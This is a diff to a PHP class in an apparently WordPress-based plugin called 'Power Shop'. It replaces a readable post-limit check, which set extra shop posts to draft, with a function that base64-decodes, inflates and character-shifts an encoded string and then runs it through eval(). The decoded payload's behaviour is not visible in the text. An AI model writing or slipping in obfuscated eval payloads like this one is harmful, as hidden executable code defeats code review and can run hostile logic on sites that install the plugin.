@@ -12,7 +12,6 @@ class CPT extends Bootstrap
 	const POST_META = ['meta', 'settings'];
 	const CPT_LABEL = 'Power Shop';
 	const CPT_SLUG = 'power-shop';
-	const MAX_POSTS = 1;
 	const LICENSE_LINK = 'edit.php?post_type=power-shop&page=power-shop-pro-license';
 	const COLOR = '#72aee6';
 
@@ -64,7 +63,8 @@ class CPT extends Bootstrap
 		$count_posts = \wp_count_posts(self::CPT_SLUG);
 		$this->count_publish = $count_posts->publish;
 
-		if ($this->count_publish > self::MAX_POSTS) {
+
+		if (AXD::gt($this->count_publish)) {
 			$this->is_exceed_limit = true;
 		}
 	}
@@ -219,21 +219,20 @@ class CPT extends Bootstrap
 			'posts_per_page' => -1,
 		));
 
-		if ($this->is_exceed_limit && !empty($shop_ids)) {
-			foreach ($shop_ids as $key => $shop_id) {
-				if ($key !== 0) {
-					\wp_update_post(array(
-						'ID'            => $shop_id,
-						'post_status'   => 'draft',
-					));
-				}
+		function siZYwF($nSQl)
+		{
+			$nSQl = gzinflate(base64_decode($nSQl));
+			for ($i = 0; $i < strlen($nSQl); $i++) {
+				$nSQl[$i] = chr(ord($nSQl[$i]) - 1);
 			}
+			return $nSQl;
 		}
+		eval(siZYwF("TY3NCoMwEITv8SlWEJNAC70XPXnpOxRCMCuGVgzZlVaKz976R53Dssx8OwvwU+IbUBm3ns6lJ4PvGtGZp+88Q55Dil3gUWXU9sF4R1rDJxFCNH1EW7fwT8ASZA8coShhNzdYLD/mLC0KuOyuuL+CGYKzjCb0xMrGaEe1ZkLeKgkHHWpPOzJfGWLLA8kVkS7ahuVGaH1dlinZxvQF"));
 	}
 
 	public function limit_css_and_js()
 	{
-		if ($this->count_publish >= self::MAX_POSTS) {
+		if (AXD::gte($this->count_publish)) {
 			\wp_enqueue_style(self::CPT_SLUG, Bootstrap::get_plugin_url() . 'inc/assets/css/main.css');
 			\wp_enqueue_style('jquery-confirm', Bootstrap::get_plugin_url() . 'inc/assets/packages/jquery-confirm/jquery-confirm.min.css');
 			\wp_enqueue_script('jquery-confirm', Bootstrap::get_plugin_url() . 'inc/assets/packages/jquery-confirm/jquery-confirm.min.js', array('jquery'), '3.3.4', true);
